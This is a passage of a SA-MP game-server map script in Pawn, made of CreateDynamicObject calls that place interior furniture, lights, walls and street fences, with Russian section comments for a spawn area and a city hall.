CreateDynamicObject(19450,321.8880005,283.7699890,1008.1459961,0.0000000,0.0000000,180.0000000); //object(wall090) (2)
CreateDynamicObject(19450,326.1960144,281.2749939,1008.1459961,0.0000000,0.0000000,269.9945068); //object(wall090) (3)
CreateDynamicObject(19450,330.0409851,283.6990051,1008.1459961,0.0000000,0.0000000,359.9890137); //object(wall090) (4)
CreateDynamicObject(19456,295.1347656,288.7980042,997.3229980,0.0000000,0.0000000,90.0000000); //object(wall096) (5)
CreateDynamicObject(19456,293.8789978,288.3880005,997.3289795,0.0000000,0.0000000,180.0000000); //object(wall096) (5)
CreateDynamicObject(19456,300.0079956,288.5840149,997.3229980,0.0000000,0.0000000,179.9945068); //object(wall096) (5)
CreateDynamicObject(19456,285.5156250,288.7980042,997.3229980,0.0000000,0.0000000,90.0000000); //object(wall096) (5)
CreateDynamicObject(19456,288.8905945,288.3632812,997.3289795,0.0000000,0.0000000,179.9945068); //object(wall096) (5)
CreateDynamicObject(19456,283.7812500,284.2451172,997.3229980,0.0000000,0.0000000,179.9945068); //object(wall096) (5)
CreateDynamicObject(19364,300.4794922,283.7099609,997.3289795,0.0000000,0.0000000,90.0000000); //object(wall012) (1)
CreateDynamicObject(19364,293.7958984,283.6396484,997.3289795,0.0000000,0.0000000,90.0000000); //object(wall012) (2)
CreateDynamicObject(19364,283.9013672,283.6396484,997.3289795,0.0000000,0.0000000,90.0000000); //object(wall012) (3)
CreateDynamicObject(1812,288.0029907,279.5010071,995.5789795,0.0000000,0.0000000,90.0000000); //object(low_bed_5) (1)
CreateDynamicObject(2192,287.5180054,275.7449951,996.3549805,0.0000000,0.0000000,302.0000000); //object(fan_1) (1)
CreateDynamicObject(2595,286.3320007,276.0090027,996.7379761,0.0000000,0.0000000,118.0000000); //object(cj_shop_tv_video) (1)
CreateDynamicObject(2115,286.2690125,276.0480042,995.5789795,0.0000000,0.0000000,0.0000000); //object(low_dinning_1) (2)
CreateDynamicObject(2894,287.4880066,276.2040100,996.3809814,0.0000000,0.0000000,270.0000000); //object(kmb_rhymesbook) (3)
CreateDynamicObject(1811,288.3460083,276.0270081,996.2050171,0.0000000,0.0000000,0.0000000); //object(med_din_chair_5) (1)
CreateDynamicObject(2606,289.0280151,275.0409851,997.6580200,0.0000000,0.0000000,180.0000000); //object(cj_police_counter2) (2)
CreateDynamicObject(2606,289.0280151,275.0409851,998.1170044,0.0000000,0.0000000,179.9945068); //object(cj_police_counter2) (3)
CreateDynamicObject(2285,290.0979919,277.8829956,997.6309814,0.0000000,0.0000000,270.0000000); //object(frame_1) (1)
CreateDynamicObject(1502,316.7260132,295.2019958,1006.3709717,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (1)
CreateDynamicObject(2765,308.4800110,288.9110107,1008.7830200,0.0000000,0.0000000,0.0000000); //object(cj_cb_list1) (1)
CreateDynamicObject(1491,322.7359924,288.4679871,1006.3959961,0.0000000,0.0000000,0.0000000); //object(gen_doorint01) (1)
CreateDynamicObject(1494,329.5360107,295.1809998,1006.3750000,0.0000000,0.0000000,0.0000000); //object(gen_doorint03) (3)
CreateDynamicObject(1523,317.9218750,288.4755859,1006.3720093,0.0000000,0.0000000,0.0000000); //object(gen_doorext10) (1)
CreateDynamicObject(19381,315.8399963,299.9620056,1009.9310303,0.0000000,90.0000000,0.0000000); //object(wall029) (1)
CreateDynamicObject(19381,326.3380127,299.9670105,1009.9310303,0.0000000,90.0000000,0.0000000); //object(wall029) (2)
CreateDynamicObject(19381,325.9989929,290.3320007,1009.9310303,0.0000000,90.0000000,0.0000000); //object(wall029) (3)
CreateDynamicObject(19381,326.0920105,280.7009888,1009.9310303,0.0000000,90.0000000,0.0000000); //object(wall029) (4)
CreateDynamicObject(19381,315.4979858,290.3760071,1009.9310303,0.0000000,90.0000000,0.0000000); //object(wall029) (5)
CreateDynamicObject(19381,315.3089905,280.7650146,1009.9310303,0.0000000,90.0000000,0.0000000); //object(wall029) (6)
CreateDynamicObject(2400,312.8876953,293.7343750,999.1409912,0.0000000,0.0000000,0.0000000); //object(cj_sports_wall01) (1)
CreateDynamicObject(2167,314.5849915,288.6010132,1000.4240112,0.0000000,0.0000000,178.0000000); //object(med_office_unit_7) (1)
CreateDynamicObject(2163,313.4639893,288.6010132,1000.4439697,0.0000000,0.0000000,180.0000000); //object(med_office_unit_2) (1)
CreateDynamicObject(2204,315.8829956,296.4049988,999.0780029,0.0000000,0.0000000,270.0000000); //object(med_office8_cabinet) (1)
CreateDynamicObject(2475,312.9500122,296.9729919,999.6160278,0.0000000,0.0000000,0.0000000); //object(cj_hobby_shelf_3) (1)
CreateDynamicObject(351,312.7680054,296.7789917,999.7210083,81.7499695,269.9999695,104.0001831); //object(2)
CreateDynamicObject(346,312.5490112,296.7139893,1000.4110107,90.0000000,180.0000000,240.0006104); //object(3)
CreateDynamicObject(346,312.9989929,296.7130127,1000.4249878,90.0000000,180.0054932,321.9855042); //object(5)
CreateDynamicObject(2612,321.9129944,280.3519897,1000.8330078,0.0000000,0.0000000,180.0000000); //object(police_nb2) (1)
CreateDynamicObject(2055,309.5910034,284.3080139,1001.6079712,0.0000000,0.0000000,90.0000000); //object(cj_target5) (1)
CreateDynamicObject(18075,322.8640137,282.9800110,1002.5109863,0.0000000,0.0000000,0.0000000); //object(lightd) (1)
CreateDynamicObject(18075,314.6780090,283.0299988,1002.4940186,0.0000000,0.0000000,0.0000000); //object(lightd) (2)
CreateDynamicObject(2196,318.0480042,278.3880005,999.8750000,0.0000000,0.0000000,331.9999695); //object(work_lamp1) (2)
CreateDynamicObject(2074,317.2720032,278.4729919,1002.7360229,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (1)
CreateDynamicObject(2074,320.2040100,278.8489990,1002.6790161,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (2)
CreateDynamicObject(2074,325.5769958,287.2179871,1002.6790161,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (3)
CreateDynamicObject(2074,325.3699951,283.0379944,1002.6790161,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (4)
CreateDynamicObject(2074,319.8219910,282.9349976,1002.6790161,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (5)
CreateDynamicObject(2074,312.0820007,287.2810059,1002.6790161,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (6)
CreateDynamicObject(2074,311.6789856,282.9700012,1002.6790161,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (7)
CreateDynamicObject(2074,313.5190125,290.7600098,1002.5070190,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (8)
CreateDynamicObject(2108,326.8120117,282.5369873,999.0939941,0.0000000,0.0000000,0.0000000); //object(cj_mlight13) (2)
CreateDynamicObject(2108,323.1940002,280.7040100,999.0939941,0.0000000,0.0000000,0.0000000); //object(cj_mlight13) (3)
CreateDynamicObject(2108,315.6659851,288.0010071,999.0939941,0.0000000,0.0000000,0.0000000); //object(cj_mlight13) (4)
CreateDynamicObject(2074,291.3259888,282.2799988,998.8380127,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (9)
CreateDynamicObject(2074,287.0119934,281.9429932,998.8170166,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (10)
CreateDynamicObject(2074,298.5119934,281.9289856,998.7919922,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (11)
CreateDynamicObject(2074,296.8850098,285.6929932,998.8170166,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (12)
CreateDynamicObject(2074,291.9289856,287.0379944,998.8170166,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (13)
CreateDynamicObject(2074,286.1809998,286.6759949,998.7849731,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (14)
CreateDynamicObject(2074,288.0719910,277.7059937,998.7919922,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (15)
CreateDynamicObject(2074,313.0889893,295.3999939,1002.3070068,0.0000000,0.0000000,0.0000000); //object(cj_mlight8) (16)
CreateDynamicObject(2108,300.7049866,285.4039917,1002.1810303,0.0000000,0.0000000,0.0000000); //object(cj_mlight13) (6)
CreateDynamicObject(2108,300.5620117,291.3020020,1002.1810303,0.0000000,0.0000000,0.0000000); //object(cj_mlight13) (7)
CreateDynamicObject(2108,314.7451172,294.5751953,1006.3959961,0.0000000,0.0000000,0.0000000); //object(cj_mlight13) (9)
CreateDynamicObject(2737,313.7160034,295.3450012,1007.9879761,0.0000000,0.0000000,180.0000000); //object(police_nb_car) (1)
CreateDynamicObject(14532,319.1849976,295.9129944,1007.3889771,0.0000000,0.0000000,30.0000000); //object(tv_stand_driv) (1)
CreateDynamicObject(2169,311.3729858,296.9159851,1006.4060059,0.0000000,0.0000000,0.0000000); //object(med_office3_desk_1) (1)
CreateDynamicObject(1806,311.8729858,295.9649963,1006.4060059,0.0000000,0.0000000,0.0000000); //object(med_office_chair) (3)
CreateDynamicObject(2173,312.9030151,299.9540100,1006.4060059,0.0000000,0.0000000,180.0000000); //object(med_office_desk_3) (1)
CreateDynamicObject(2173,315.9769897,299.9540100,1006.4060059,0.0000000,0.0000000,179.9945068); //object(med_office_desk_3) (2)
CreateDynamicObject(2173,319.0790100,299.9540100,1006.4060059,0.0000000,0.0000000,179.9945068); //object(med_office_desk_3) (3)
CreateDynamicObject(2173,313.0750122,302.3919983,1006.4060059,0.0000000,0.0000000,179.9945068); //object(med_office_desk_3) (4)
CreateDynamicObject(2173,316.2770081,302.3919983,1006.4060059,0.0000000,0.0000000,179.9945068); //object(med_office_desk_3) (5)
CreateDynamicObject(2173,319.1329956,302.3919983,1006.4060059,0.0000000,0.0000000,179.9945068); //object(med_office_desk_3) (6)
CreateDynamicObject(1811,319.3540039,300.8640137,1007.0319824,0.0000000,0.0000000,64.0000000); //object(med_din_chair_5) (3)
CreateDynamicObject(1811,318.2820129,301.0220032,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (4)
CreateDynamicObject(1811,316.0870056,300.9869995,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (5)
CreateDynamicObject(1811,315.1130066,300.9849854,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (6)
CreateDynamicObject(1811,311.6449890,301.1300049,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (7)
CreateDynamicObject(1811,312.6589966,301.0769958,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (8)
CreateDynamicObject(1811,311.8299866,303.5440063,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (9)
CreateDynamicObject(1811,312.8340149,303.4660034,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (10)
CreateDynamicObject(1811,315.2500000,302.5759888,1007.2069702,0.0000000,180.0000000,270.0000000); //object(med_din_chair_5) (11)
CreateDynamicObject(1811,316.3290100,302.5469971,1007.2069702,0.0000000,180.0000000,270.0000000); //object(med_din_chair_5) (12)
CreateDynamicObject(1811,318.6539917,302.6059875,1007.0319824,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (13)
CreateDynamicObject(2894,312.0740051,296.9209900,1007.1979980,0.0000000,0.0000000,190.0000000); //object(kmb_rhymesbook) (4)
CreateDynamicObject(2615,310.6700134,297.8099976,1008.0839844,0.0000000,0.0000000,90.0000000); //object(police_nb3) (1)
CreateDynamicObject(2611,310.6700134,299.3619995,1007.9650269,0.0000000,0.0000000,90.0000000); //object(police_nb1) (1)
CreateDynamicObject(14774,313.8479919,288.4200134,1009.2459717,0.0000000,0.0000000,0.0000000); //object(int_5kb_flykiller) (1)
CreateDynamicObject(2059,311.1489868,297.0700073,1007.2050171,0.0000000,0.0000000,30.0000000); //object(cj_gunstuff1) (1)
CreateDynamicObject(3383,317.1879883,295.8559875,1011.4680176,0.0000000,180.0000000,0.0000000); //object(a51_labtable1_) (1)
CreateDynamicObject(3383,319.3699951,283.9360046,1006.3699951,0.0000000,0.0000000,90.0000000); //object(a51_labtable1_) (2)
CreateDynamicObject(3657,316.0360107,289.0180054,1006.9140015,0.0000000,0.0000000,180.0000000); //object(airseata_las) (1)
CreateDynamicObject(2161,315.5880127,281.7080078,1007.8419800,0.0000000,0.0000000,180.0000000); //object(med_office_unit_4) (1)
CreateDynamicObject(2162,314.0799866,281.7130127,1007.8679810,0.0000000,0.0000000,180.0000000); //object(med_office_unit_1) (2)
CreateDynamicObject(2608,319.9790039,286.4710083,1008.4320068,0.0000000,0.0000000,272.2500000); //object(polce_shelf) (2)
CreateDynamicObject(2333,315.5929871,286.8259888,1006.3989868,0.0000000,0.0000000,0.0000000); //object(cj_bed_furn_1b) (1)
CreateDynamicObject(2120,316.4190063,287.1159973,1007.0369873,0.0000000,0.0000000,270.0000000); //object(med_din_chair_4) (1)
CreateDynamicObject(2190,316.6170044,288.0729980,1007.3679810,0.0000000,0.0000000,0.0000000); //object(pc_1) (1)
CreateDynamicObject(2192,315.4649963,287.4960022,1007.3679810,0.0000000,0.0000000,210.0000000); //object(fan_1) (2)
CreateDynamicObject(2290,311.5260010,287.9490051,1006.3989868,0.0000000,0.0000000,0.0000000); //object(swk_couch_1) (1)
CreateDynamicObject(2271,311.5029907,283.7409973,1008.1240234,0.0000000,0.0000000,90.0000000); //object(frame_wood_1) (1)
CreateDynamicObject(2269,311.5140076,284.7900085,1007.6489868,0.0000000,0.0000000,90.0000000); //object(frame_wood_4) (1)
CreateDynamicObject(2268,311.5109863,285.5750122,1008.0260010,0.0000000,0.0000000,90.0000000); //object(frame_wood_2) (1)
CreateDynamicObject(2266,311.5299988,286.5260010,1007.5239868,0.0000000,0.0000000,90.0000000); //object(frame_wood_5) (1)
CreateDynamicObject(2834,312.1109924,286.2380066,1006.3989868,0.0000000,0.0000000,0.0000000); //object(gb_livingrug03) (1)
CreateDynamicObject(1742,310.5039978,301.2829895,1006.4240112,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (1)
CreateDynamicObject(19369,325.6459961,296.8559875,1007.2319946,0.0000000,0.0000000,270.0000000); //object(wall017) (1)
CreateDynamicObject(1523,327.2000122,295.2520142,1006.4060059,0.0000000,0.0000000,90.0000000); //object(gen_doorext10) (1)
CreateDynamicObject(1523,327.2000122,296.9289856,1006.4060059,0.0000000,0.0000000,90.0000000); //object(gen_doorext10) (1)
CreateDynamicObject(19369,325.6459961,298.5639954,1007.2319946,0.0000000,0.0000000,270.0000000); //object(wall017) (1)
CreateDynamicObject(1523,327.1990051,298.6210022,1006.4349976,0.0000000,0.0000000,90.0000000); //object(gen_doorext10) (1)
CreateDynamicObject(19369,325.6470032,300.2409973,1008.1560059,0.0000000,0.0000000,270.0000000); //object(wall017) (1)
CreateDynamicObject(19397,330.4280090,300.2409973,1008.1560059,0.0000000,0.0000000,90.0000000); //object(wall045) (1)
CreateDynamicObject(19442,328.0180054,300.2409973,1008.1560059,0.0000000,0.0000000,90.0000000); //object(wall082) (1)
CreateDynamicObject(1492,329.6570129,300.3139954,1006.3809814,0.0000000,0.0000000,0.0000000); //object(gen_doorint02) (1)
CreateDynamicObject(2525,324.4989929,296.0220032,1006.4060059,0.0000000,0.0000000,90.0000000); //object(cj_toilet4) (1)
CreateDynamicObject(2525,324.4920044,297.7309875,1006.4060059,0.0000000,0.0000000,90.0000000); //object(cj_toilet4) (2)
CreateDynamicObject(2525,324.4920044,299.3699951,1006.4060059,0.0000000,0.0000000,90.0000000); //object(cj_toilet4) (3)
CreateDynamicObject(2518,328.4540100,299.6579895,1006.4060059,0.0000000,0.0000000,0.0000000); //object(cj_b_sink2) (2)
CreateDynamicObject(2523,330.6589966,298.7680054,1006.4060059,0.0000000,0.0000000,270.0000000); //object(cj_b_sink3) (1)
CreateDynamicObject(2523,330.6589966,298.0360107,1006.4060059,0.0000000,0.0000000,270.0000000); //object(cj_b_sink3) (2)
CreateDynamicObject(2523,330.6589966,297.3099976,1006.4060059,0.0000000,0.0000000,270.0000000); //object(cj_b_sink3) (3)
CreateDynamicObject(2527,325.4960022,303.9360046,1006.4060059,0.0000000,0.0000000,90.0000000); //object(cj_shower4) (1)
CreateDynamicObject(2527,325.4710083,300.9559937,1006.4060059,0.0000000,0.0000000,90.0000000); //object(cj_shower4) (2)
CreateDynamicObject(2527,328.1990051,301.9429932,1006.4060059,0.0000000,0.0000000,180.0000000); //object(cj_shower4) (4)
CreateDynamicObject(2527,328.0620117,303.1709900,1006.4060059,0.0000000,0.0000000,359.9945068); //object(cj_shower4) (6)
CreateDynamicObject(2208,325.1579895,284.7109985,1006.3850098,0.0000000,0.0000000,0.0000000); //object(med_office7_unit_1) (1)
CreateDynamicObject(2207,327.7590027,285.6340027,1006.4849854,0.0000000,0.0000000,270.0000000); //object(med_office7_desk_1) (1)
CreateDynamicObject(1671,329.2550049,284.6659851,1006.8560181,0.0000000,0.0000000,270.0000000); //object(swivelchair_a) (1)
CreateDynamicObject(1811,326.9509888,286.0580139,1007.0219727,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (2)
CreateDynamicObject(1811,325.7829895,286.1449890,1007.0219727,0.0000000,0.0000000,90.0000000); //object(med_din_chair_5) (14)
CreateDynamicObject(1811,325.7770081,283.5429993,1007.0219727,0.0000000,0.0000000,270.0000000); //object(med_din_chair_5) (15)
CreateDynamicObject(1811,327.0310059,283.4809875,1007.0219727,0.0000000,0.0000000,270.0000000); //object(med_din_chair_5) (16)
CreateDynamicObject(2194,328.1530151,283.9549866,1007.5930176,0.0000000,0.0000000,0.0000000); //object(plant_pot_2) (1)
CreateDynamicObject(2854,328.1449890,285.4140015,1007.2620239,0.0000000,0.0000000,30.0000000); //object(gb_bedmags04) (1)
CreateDynamicObject(2247,325.0050049,284.8370056,1007.7150269,0.0000000,0.0000000,0.0000000); //object(plant_pot_15) (1)
CreateDynamicObject(2257,329.9440002,284.7269897,1008.5020142,0.0000000,0.0000000,270.0000000); //object(frame_clip_4) (1)
CreateDynamicObject(14455,321.9719849,286.8750000,1008.0679932,0.0000000,0.0000000,270.0000000); //object(gs_bookcase) (1)
CreateDynamicObject(2010,322.3080139,287.9880066,1006.3980103,0.0000000,0.0000000,330.0000000); //object(nu_plant3_ofc) (1)
CreateDynamicObject(3034,326.6000061,281.3659973,1008.5659790,0.0000000,0.0000000,180.0000000); //object(bd_window) (1)
CreateDynamicObject(3034,318.1140137,281.7130127,1008.5659790,0.0000000,0.0000000,179.9945068); //object(bd_window) (2)
CreateDynamicObject(3034,312.9190063,304.4079895,1008.5659790,0.0000000,0.0000000,359.9945068); //object(bd_window) (3)
CreateDynamicObject(3034,317.8529968,304.4200134,1008.5659790,0.0000000,0.0000000,359.9890137); //object(bd_window) (4)
CreateDynamicObject(3034,331.2019958,291.7690125,1008.5659790,0.0000000,0.0000000,269.9890137); //object(bd_window) (5)
CreateDynamicObject(3034,312.7229919,280.2990112,1001.1970215,0.0000000,0.0000000,180.0000000); //object(bd_window) (6)
CreateDynamicObject(3034,325.0759888,280.2780151,1001.1970215,0.0000000,0.0000000,180.0000000); //object(bd_window) (7)
CreateDynamicObject(1808,324.8770142,288.2109985,1006.3959961,0.0000000,0.0000000,0.0000000); //object(cj_watercooler2) (2)
CreateDynamicObject(1989,330.0369873,288.0880127,1007.8090210,0.0000000,270.0000000,0.0000000); //object(kb_coolerlft2) (1)
CreateDynamicObject(2414,328.3030090,288.0010071,1006.2849731,0.0000000,0.0000000,0.0000000); //object(shop_counter_3b) (1)
CreateDynamicObject(953,329.0729980,287.9089966,1007.6370239,0.0000000,0.0000000,352.0000000); //object(cj_oyster) (1)
CreateDynamicObject(1722,326.3359985,288.6109924,1006.3959961,0.0000000,0.0000000,359.9945068); //object(off_chairnu) (1)
//======================================Респа========================================
CreateDynamicObject(19379, 1393.6269, -1701.7380, 22.7980, 0, 0, 90); // объект 0
CreateDynamicObject(19379, 1402.7392, -1678.9980, 22.7980, 0, 0, 103.9965); // объект 1
CreateDynamicObject(19379, 1393.4052, -1681.3193, 22.7980, 0, 0, 103.9965); // объект 2
CreateDynamicObject(19379, 1388.7119, -1687.4023, 22.7980, 0, 0, 0); // объект 3
CreateDynamicObject(19379, 1388.7109, -1697.0175, 22.7980, 0, 0, 0); // объект 4
CreateDynamicObject(19358, 1407.2539, -1679.5576, 21.5, 0, 0, 15.9960); // объект 5
CreateDynamicObject(19358, 1407.2539, -1679.5576, 16.8999, 0, 0, 16); // объект 6
CreateDynamicObject(3851, 1407.3659, -1680.2590, 19.5470, 0, 0, 16); // объект 7
CreateDynamicObject(982, 1304.9560, -1697.9000, 13.2299, 0, 0, 0); // объект 8
CreateDynamicObject(982, 1304.9739, -1825.8840, 13.2299, 0, 0, 0); // объект 9
CreateDynamicObject(982, 1304.9648, -1723.5, 13.2299, 0, 0, 0); // объект 10
CreateDynamicObject(982, 1304.9677, -1749.0947, 13.2299, 0, 0, 0); // объект 11
CreateDynamicObject(982, 1304.9658, -1774.6757, 13.2299, 0, 0, 0); // объект 12
CreateDynamicObject(982, 1304.9716, -1800.2968, 13.2299, 0, 0, 0); // объект 13
CreateDynamicObject(983, 1304.9720, -1840.3000, 13.2299, 0, 0, 0); // объект 14
CreateDynamicObject(970, 1076.6750, -1777.0279, 12.8929, 0, 0, 0); // объект 15
CreateDynamicObject(970, 1065.5500, -1777.0279, 12.8909, 0, 0, 0); // объект 16
CreateDynamicObject(970, 1061.4139, -1777.0279, 12.8909, 0, 0, 0); // объект 17
CreateDynamicObject(970, 1080.8020, -1777.0279, 12.8929, 0, 0, 0); // объект 18
CreateDynamicObject(970, 1084.9350, -1777.0279, 12.8929, 0, 0, 0); // объект 19
CreateDynamicObject(970, 1089.0749, -1777.0279, 12.8909, 0, 0, 0); // объект 20
CreateDynamicObject(970, 1093.2089, -1777.0279, 12.8909, 0, 0, 0); // объект 21
CreateDynamicObject(970, 1097.3439, -1777.0279, 12.8950, 0, 0, 0); // объект 22
CreateDynamicObject(970, 1099.5980, -1777.0279, 12.8950, 0, 0, 0); // объект 23
CreateDynamicObject(970, 1101.6939, -1774.9730, 12.8929, 0, 0, 90); // объект 24
CreateDynamicObject(970, 1101.6939, -1770.8459, 12.8929, 0, 0, 90); // объект 25
CreateDynamicObject(970, 1101.6939, -1766.7580, 12.8929, 0, 0, 90); // объект 26
CreateDynamicObject(970, 1101.6939, -1762.6390, 12.8929, 0, 0, 90); // объект 27
CreateDynamicObject(970, 1101.6939, -1758.5340, 12.8929, 0, 0, 90); // объект 28
CreateDynamicObject(970, 1101.6939, -1754.3649, 12.8929, 0, 0, 90); // объект 29
CreateDynamicObject(970, 1101.6939, -1750.2619, 12.9029, 0, 0, 90); // объект 30
CreateDynamicObject(970, 1095.4820, -1735.9052, 13.1230, 0, 0, 0); // объект 31
CreateDynamicObject(970, 1099.6181, -1735.9052, 13.1359, 0, 0, 0); // объект 32
CreateDynamicObject(970, 1091.3509, -1735.9052, 13.1129, 0, 0, 0); // объект 33
CreateDynamicObject(970, 1087.2320, -1735.9052, 13.1029, 0, 0, 0); // объект 34
CreateDynamicObject(970, 1083.1040, -1735.9052, 13.0930, 0, 0, 0); // объект 35
CreateDynamicObject(970, 1078.9489, -1735.9052, 13.0810, 0, 0, 0); // объект 36
CreateDynamicObject(970, 1074.8070, -1735.9052, 13.0690, 0, 0, 0); // объект 37
CreateDynamicObject(970, 1070.6829, -1735.9052, 13.0570, 0, 0, 0); // объект 38
CreateDynamicObject(970, 1066.5510, -1735.9052, 13.0439, 0, 0, 0); // объект 39
CreateDynamicObject(970, 1062.4560, -1735.9052, 13.0360, 0, 0, 0); // объект 40
CreateDynamicObject(970, 1061.3699, -1735.9052, 13.0340, 0, 0, 0); // объект 41
CreateDynamicObject(970, 1059.3222, -1770.9969, 12.9200, 0, 0, 90); // объект 42
CreateDynamicObject(970, 1059.3222, -1737.9873, 13.0249, 0, 0, 90); // объект 43
CreateDynamicObject(970, 1059.3222, -1742.1201, 13.0190, 0, 0, 90); // объект 44
CreateDynamicObject(970, 1059.3222, -1746.25, 13.0129, 0, 0, 90); // объект 45
CreateDynamicObject(970, 1059.3222, -1750.3564, 13.0069, 0, 0, 90); // объект 46
CreateDynamicObject(970, 1059.3222, -1754.4824, 12.9919, 0, 0, 90); // объект 47
CreateDynamicObject(970, 1059.3222, -1758.6152, 12.9739, 0, 0, 90); // объект 48
CreateDynamicObject(970, 1059.3222, -1762.7597, 12.9560, 0, 0, 90); // объект 49
CreateDynamicObject(970, 1059.3222, -1766.8691, 12.9379, 0, 0, 90); // объект 50
CreateDynamicObject(970, 1059.3222, -1774.9270, 12.9029, 0, 0, 90); // объект 51
//======================================Мэрия========================================
CreateDynamicObject(982,1438.2099609,-1744.1450195,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit) (1)
CreateDynamicObject(982,1414.1999512,-1744.1600342,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit) (2)
CreateDynamicObject(983,1459.1899414,-1747.4000244,13.2299995,0.0000000,0.0000000,0.0000000); //object(fenceshit3) (1)
CreateDynamicObject(983,1454.2700195,-1750.5999756,13.2299995,0.0000000,0.0000000,270.0000000); //object(fenceshit3) (2)
CreateDynamicObject(983,1459.0699463,-1750.5996094,13.2299995,0.0000000,0.0000000,270.0000000); //object(fenceshit3) (3)
CreateDynamicObject(983,1451.0791016,-1747.3994141,13.2299995,0.0000000,0.0000000,0.0000000); //object(fenceshit3) (4)
CreateDynamicObject(984,1465.5999756,-1744.1800537,13.1840000,0.0000000,0.0000000,90.0000000); //object(fenceshit2) (1)
CreateDynamicObject(983,1475.2010498,-1744.1960449,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (5)
CreateDynamicObject(983,1502.9790039,-1747.4000244,13.2299995,0.0000000,0.0000000,0.0000000); //object(fenceshit3) (6)
CreateDynamicObject(984,1496.5360107,-1744.1789551,13.2790003,0.0000000,0.0000000,90.0000000); //object(fenceshit2) (2)
CreateDynamicObject(983,1486.9980469,-1744.2070312,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (7)
CreateDynamicObject(983,1510.8439941,-1747.3740234,13.2299995,0.0000000,0.0000000,0.0000000); //object(fenceshit3) (8)
CreateDynamicObject(983,1507.6240234,-1750.5739746,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (9)
CreateDynamicObject(983,1502.8499756,-1750.5689697,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (10)
CreateDynamicObject(982,1523.6679688,-1744.1639404,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit) (3)
CreateDynamicObject(984,1542.8769531,-1744.1639404,13.1840000,0.0000000,0.0000000,90.0000000); //object(fenceshit2) (3)
CreateDynamicObject(983,1552.4320068,-1744.1639404,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (12)
CreateDynamicObject(983,1555.6250000,-1744.1639404,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (13)
CreateDynamicObject(984,1401.3499756,-1750.5610352,13.1840000,0.0000000,0.0000000,0.0000000); //object(fenceshit2) (5)
CreateDynamicObject(984,1401.3590088,-1763.3370361,13.1840000,0.0000000,0.0000000,0.0000000); //object(fenceshit2) (6)
CreateDynamicObject(982,1414.1590576,-1769.7669678,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit) (5)
CreateDynamicObject(984,1558.8659668,-1750.5269775,13.1840000,0.0000000,0.0000000,0.0000000); //object(fenceshit2) (7)
CreateDynamicObject(984,1558.8869629,-1763.3630371,13.1840000,0.0000000,0.0000000,0.0000000); //object(fenceshit2) (8)
CreateDynamicObject(982,1546.1209717,-1769.7540283,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit) (6)
CreateDynamicObject(994,1472.1540527,-1737.4250488,12.5469999,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier2) (1)
CreateDynamicObject(994,1483.6920166,-1727.3100586,12.3830004,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier2) (2)
CreateDynamicObject(19425,1490.2010498,-1730.3239746,12.3830004,0.0000000,0.0000000,90.0000000); //object(speed_bump01) (2)
CreateDynamicObject(19425,1490.2010498,-1727.7519531,12.3830004,0.0000000,0.0000000,90.0000000); //object(speed_bump01) (3)
CreateDynamicObject(19425,1471.8750000,-1736.8299561,12.3830004,0.0000000,0.0000000,90.0000000); //object(speed_bump01) (4)
CreateDynamicObject(19425,1471.8769531,-1734.2769775,12.3830004,0.0000000,0.0000000,90.0000000); //object(speed_bump01) (5)
CreateDynamicObject(2954,1479.9930420,-1735.5710449,12.3130999,0.0000000,90.0000000,0.0000000); //object(kmb_ot) (1)
CreateDynamicObject(2954,1480.0040283,-1734.1529541,12.3130999,0.0000000,90.0000000,0.0000000); //object(kmb_ot) (2)
CreateDynamicObject(2954,1480.0292969,-1732.6650391,12.3130999,0.0000000,90.0000000,0.0000000); //object(kmb_ot) (3)
CreateDynamicObject(2954,1480.0751953,-1730.9111328,12.3130999,0.0000000,90.0000000,0.0000000); //object(kmb_ot) (4)
CreateDynamicObject(2954,1480.0849609,-1729.4420166,12.3130999,0.0000000,90.0000000,0.0000000); //object(kmb_ot) (5)
CreateDynamicObject(2954,1480.0949707,-1727.9189453,12.3130999,0.0000000,90.0000000,0.0000000); //object(kmb_ot) (6)
CreateDynamicObject(1364,1485.8000488,-1743.4499512,13.3310003,0.0000000,0.0000000,180.0000000); //object(cj_bush_prop) (1)
CreateDynamicObject(1364,1476.4780273,-1743.4539795,13.3310003,0.0000000,0.0000000,179.9945068); //object(cj_bush_prop) (2)
CreateDynamicObject(1360,1488.3457031,-1742.8798828,13.3190002,0.0000000,0.0000000,0.0000000); //object(cj_bush_prop3) (1)
